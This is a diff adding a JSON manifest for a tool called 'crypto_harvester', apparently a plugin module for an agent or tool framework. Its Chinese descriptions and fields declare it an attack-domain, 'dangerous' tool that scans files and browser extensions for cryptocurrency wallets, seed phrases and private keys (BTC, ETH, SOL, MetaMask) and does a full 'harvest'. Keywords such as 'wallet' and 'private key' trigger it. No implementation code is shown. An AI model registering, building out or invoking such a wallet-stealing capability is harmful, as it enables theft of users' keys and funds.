@@ -1,0 +1,39 @@
+{
+  "_stamp": "⛔ 开发者：自由的风 · 永久钢印 · 禁止删除",
+  "name": "crypto_harvester",
+  "version": "1.0.0",
+  "description": "加密钱包收割机 — BTC/ETH/SOL/MetaMask/助记词/浏览器插件/Plisio",
+  "language": "python",
+  "risk_level": "dangerous",
+  "auto_exec": false,
+  "category": "攻击域",
+  "actions": {
+    "scan": {
+      "description": "扫描文件中的加密钱包"
+    },
+    "browsers": {
+      "description": "扫描浏览器插件钱包"
+    },
+    "harvest": {
+      "description": "全量收割(文件+浏览器+Plisio)"
+    },
+    "plisio": {
+      "description": "Plisio余额查询"
+    }
+  },
+  "triggers": {
+    "keywords": [
+      "加密",
+      "钱包",
+      "crypto",
+      "wallet",
+      "私钥",
+      "助记词",
+      "BTC",
+      "ETH",
+      "SOL",
+      "MetaMask"
+    ],
+    "intent": "crypto_harvest"
+  }
+}
